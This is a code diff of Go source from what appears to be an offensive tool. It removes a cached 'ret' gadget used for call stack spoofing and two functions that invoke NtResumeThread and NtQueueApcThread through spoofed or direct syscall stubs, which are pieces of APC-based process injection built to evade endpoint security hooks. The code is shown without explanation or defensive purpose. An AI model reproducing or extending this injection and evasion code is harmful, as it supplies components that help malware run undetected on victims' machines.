@@ -16,8 +16,7 @@ import (
 // Caches resolved SSNs and built stubs to avoid re-parsing ntdll on every inject.
 
 type syscallManager struct {
-	stubs     map[string]uintptr
-	retGadget uintptr // cached "ret" gadget in ntdll (for call stack spoofing)
+	stubs map[string]uintptr
 }
 
 func newSyscallManager() *syscallManager {
@@ -483,43 +482,6 @@ func syscallNtClose(sm *syscallManager, handle uintptr) error {
 	r1, _, _ := syscall.Syscall(stub, 1, handle, 0, 0)
 	if r1 != 0 {
 		return fmt.Errorf("NtClose failed: 0x%X", r1)
-	}
-	return nil
-}
-
-func syscallNtResumeThread(sm *syscallManager, hThread uintptr) error {
-	stub, err := sm.getSpoofedStub("NtResumeThread")
-	if err != nil {
-		stub, err = sm.getStub("NtResumeThread")
-		if err != nil {
-			return err
-		}
-	}
-	var suspendCount uint32
-	r1, _, _ := syscall.Syscall(stub, 2, hThread, uintptr(unsafe.Pointer(&suspendCount)), 0)
-	if r1 != 0 {
-		return fmt.Errorf("NtResumeThread failed: 0x%X", r1)
-	}
-	return nil
-}
-
-func syscallNtQueueApcThread(sm *syscallManager, hThread uintptr, apcRoutine uintptr, param uintptr) error {
-	stub, err := sm.getSpoofedStub("NtQueueApcThread")
-	if err != nil {
-		stub, err = sm.getStub("NtQueueApcThread")
-		if err != nil {
-			return err
-		}
-	}
-	r1, _, _ := syscall.Syscall6(stub, 4,
-		hThread,
-		apcRoutine,
-		param,
-		0,
-		0, 0,
-	)
-	if r1 != 0 {
-		return fmt.Errorf("NtQueueApcThread failed: 0x%X", r1)
 	}
 	return nil
 }
